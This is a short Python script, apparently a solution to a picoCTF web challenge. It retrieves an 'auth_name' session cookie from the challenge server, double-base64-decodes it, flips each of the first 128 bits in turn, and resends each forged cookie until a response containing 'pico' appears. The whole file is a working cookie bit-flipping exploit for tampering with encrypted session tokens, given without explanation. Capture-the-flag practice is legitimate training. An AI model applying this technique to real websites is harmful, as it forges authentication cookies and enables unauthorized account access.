import requests
import base64

s=requests.Session()
s.get("http://mercury.picoctf.net:56136/")
cookie=s.cookies["auth_name"]
print(cookie)
unb64=base64.b64decode(cookie)
print(unb64)
unb64b=base64.b64decode(unb64)
for i in range (0,128):
   pos=i//8
   guessdec=unb64b[0:pos]+((unb64b[pos]^(1<<(i%8))).to_bytes(1,'big'))+unb64b[pos+1:]
   guessenc1 = base64.b64encode(guessdec)
   guess=base64.b64encode(base64.b64encode(guessdec)).decode()
   r=requests.get("http://mercury.picoctf.net:56136/",cookies={"auth_name": guess})
   if "pico" in r.text:
       print(r.text)